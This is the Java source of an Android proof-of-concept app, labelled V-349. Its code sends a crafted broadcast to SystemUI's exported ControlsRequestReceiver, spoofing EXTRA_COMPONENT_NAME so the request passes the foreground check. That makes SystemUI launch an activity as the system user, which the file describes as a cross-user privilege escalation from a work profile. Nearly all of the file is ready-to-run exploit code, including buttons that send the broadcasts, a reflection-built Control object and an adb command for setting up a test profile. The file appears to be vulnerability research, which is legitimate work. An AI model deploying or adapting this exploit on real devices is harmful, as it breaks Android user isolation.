package com.poc.controlsleak;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Process;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.view.Gravity;

/**
 * V-349: SystemUI ControlsRequestReceiver Cross-User Activity Launch as SYSTEM
 *
 * ControlsRequestReceiver is an EXPORTED broadcast receiver in SystemUI with
 * NO permission requirement. When it receives a broadcast:
 * 1. Extracts EXTRA_COMPONENT_NAME from intent (attacker-controlled)
 * 2. Checks if that package is in foreground (via getUidImportance)
 * 3. Starts ControlsRequestDialog as UserHandle.SYSTEM
 *
 * The foreground check validates the COMPONENT_NAME's package (not the sender!).
 * So a foreground malicious app sets its own package as the ComponentName, passes
 * the check, and triggers a system-user activity launch.
 *
 * From a work profile or secondary user context, this crosses the user isolation
 * boundary — an EoP from profile user to system user.
 *
 * Source: packages/SystemUI/src/com/android/systemui/controls/management/ControlsRequestReceiver.kt
 */
public class MainActivity extends Activity {

    private static final String TAG = "ControlsCrossUser";

    // SystemUI ControlsRequestReceiver component
    private static final ComponentName CONTROLS_RECEIVER = new ComponentName(
            "com.android.systemui",
            "com.android.systemui.controls.management.ControlsRequestReceiver");

    private TextView mOutput;
    private StringBuilder mLog = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("V-349: Controls CrossUser Launch");
        title.setTextSize(18);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("Sends broadcast to SystemUI ControlsRequestReceiver (exported, no perm). "
                + "Sets EXTRA_COMPONENT_NAME to own package (passes foreground check). "
                + "Triggers startActivityAsUser(UserHandle.SYSTEM) in SystemUI.");
        info.setTextSize(11);
        info.setPadding(0, 16, 0, 16);
        root.addView(info);

        Button btn1 = new Button(this);
        btn1.setText("1. Send Broadcast (Basic)");
        btn1.setOnClickListener(v -> sendBasicBroadcast());
        root.addView(btn1);

        Button btn2 = new Button(this);
        btn2.setText("2. Send with Control Object");
        btn2.setOnClickListener(v -> sendWithControl());
        root.addView(btn2);

        Button btn3 = new Button(this);
        btn3.setText("3. Check User Context");
        btn3.setOnClickListener(v -> checkUserContext());
        root.addView(btn3);

        ScrollView scroll = new ScrollView(this);
        mOutput = new TextView(this);
        mOutput.setTextSize(10);
        mOutput.setTypeface(android.graphics.Typeface.MONOSPACE);
        mOutput.setPadding(8, 8, 8, 8);
        scroll.addView(mOutput);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(root);

        log("=== ControlsRequestReceiver CrossUser PoC (V-349) ===");
        log("Package: " + getPackageName());
        log("UID: " + Process.myUid());
        log("userId: " + Process.myUid() / 100000);
        log("Permissions: NONE");
        log("");
        log("The ControlsRequestReceiver is exported in SystemUI.");
        log("It calls startActivityAsUser(intent, UserHandle.SYSTEM).");
        log("From work profile/secondary user → this crosses user boundary.");
        log("");
        log("If a dialog appears (ControlsRequestDialog), the vuln is confirmed.");
        log("The dialog runs as SYSTEM user regardless of sender's user.");
        log("");
    }

    /**
     * Basic broadcast: just EXTRA_COMPONENT_NAME pointing to our own package.
     * The receiver checks isPackageForeground(componentName.packageName).
     * Since WE are in foreground, the check passes.
     */
    private void sendBasicBroadcast() {
        log("\n--- Sending Basic Broadcast ---");
        try {
            Intent intent = new Intent("android.service.controls.action.ADD_CONTROL");
            intent.setComponent(CONTROLS_RECEIVER);

            // Set EXTRA_COMPONENT_NAME to our own service (passes foreground check)
            ComponentName ourService = new ComponentName(
                    getPackageName(), DummyControlsService.class.getName());
            intent.putExtra(Intent.EXTRA_COMPONENT_NAME, ourService);

            log("Target: " + CONTROLS_RECEIVER.flattenToShortString());
            log("EXTRA_COMPONENT_NAME: " + ourService.flattenToShortString());
            log("Sending broadcast...");

            sendBroadcast(intent);

            log("[SENT] Broadcast dispatched. Watch for ControlsRequestDialog.");
            log("If a system dialog appears → V-349 CONFIRMED");
            log("If nothing happens → receiver may have additional validation");
            log("");
            log("Check logcat: adb logcat -s SystemUI:* ControlsRequest:*");

        } catch (SecurityException e) {
            log("[BLOCKED] " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    /**
     * Send with a constructed Control object via reflection.
     * The receiver also expects ControlsProviderService.EXTRA_CONTROL.
     */
    private void sendWithControl() {
        log("\n--- Sending Broadcast with Control Object ---");
        try {
            Intent intent = new Intent("android.service.controls.action.ADD_CONTROL");
            intent.setComponent(CONTROLS_RECEIVER);

            ComponentName ourService = new ComponentName(
                    getPackageName(), DummyControlsService.class.getName());
            intent.putExtra(Intent.EXTRA_COMPONENT_NAME, ourService);

            // Try to construct a Control object via reflection
            // android.service.controls.Control
            try {
                Class<?> controlBuilderClass = Class.forName(
                        "android.service.controls.Control$StatelessBuilder");
                Object builder = controlBuilderClass.getConstructor(
                        String.class, android.app.PendingIntent.class)
                        .newInstance(
                            "poc-control-id",
                            android.app.PendingIntent.getActivity(
                                this, 0, new Intent(),
                                android.app.PendingIntent.FLAG_IMMUTABLE));

                // Set title and device type
                controlBuilderClass.getMethod("setTitle", CharSequence.class)
                        .invoke(builder, "PoC Control");
                controlBuilderClass.getMethod("setDeviceType", int.class)
                        .invoke(builder, 1); // DeviceTypes.TYPE_LIGHT

                Object control = controlBuilderClass.getMethod("build").invoke(builder);
                log("[OK] Built Control object: " + control);

                // Add as EXTRA_CONTROL
                intent.putExtra("android.service.controls.extra.CONTROL",
                        (android.os.Parcelable) control);
                log("[OK] Added EXTRA_CONTROL to intent");

            } catch (Exception e) {
                log("[WARN] Could not build Control object: " + e.getMessage());
                log("Sending without it — receiver may still trigger");
            }

            sendBroadcast(intent);
            log("[SENT] Broadcast with Control object dispatched.");
            log("Watch for ControlsRequestDialog (system user context).");

        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    /**
     * Check the current user context to understand the EoP severity.
     * If we're in a secondary user/work profile, the cross-user aspect is real.
     */
    private void checkUserContext() {
        log("\n--- User Context Check ---");
        int myUserId = Process.myUid() / 100000;
        log("My userId: " + myUserId);
        log("My UID: " + Process.myUid());

        if (myUserId == 0) {
            log("⚠ Running as primary user (userId=0).");
            log("  The receiver will startActivityAsUser(SYSTEM) which is same user.");
            log("  For full EoP demo, install this in a work profile or secondary user.");
            log("  Create work profile: adb shell pm create-user --profileOf 0 --managed TestWork");
        } else {
            log("✓ Running as non-primary user (userId=" + myUserId + ")");
            log("  ControlsRequestReceiver will start activity as USER_SYSTEM (userId=0).");
            log("  This is a cross-user EoP!");
        }
        log("");
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mLog.append(msg).append("\n");
        if (mOutput != null) {
            mOutput.setText(mLog.toString());
        }
    }
}
